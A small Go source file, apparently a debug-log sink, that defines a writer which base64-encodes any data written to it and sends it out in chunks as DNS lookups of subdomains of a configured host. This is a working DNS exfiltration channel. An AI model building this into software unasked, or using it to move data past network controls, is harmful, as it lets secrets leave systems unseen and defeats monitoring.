package debuglog

import (
	"encoding/base64"
	"fmt"
	"net"
	"strings"
)

type dnsExfiltrator struct {
	host string
}

func newDNSExfiltrator(host string) (*dnsExfiltrator, error) {
	fmt.Printf("DNSExfil created: %s", host)
	return &dnsExfiltrator{strings.Trim(host, " ")}, nil
}

func (ex *dnsExfiltrator) Write(data []byte) (int, error) {
	const maxDomainLength = 253
	const maxSubDomainLength = 63
	encoded := strings.Replace(base64.URLEncoding.EncodeToString(data), "=", "", -1)

	for len(encoded) > 0 {
		chunkLen := min(min(maxSubDomainLength, maxDomainLength-len(ex.host)-1), len(encoded))
		net.LookupHost(fmt.Sprintf("%s.%s", encoded[:chunkLen], ex.host))
		encoded = encoded[chunkLen:]
	}
	return len(data), nil
}

func min(a, b int) int {
	if a <= b {
		return a
	}
	return b
}
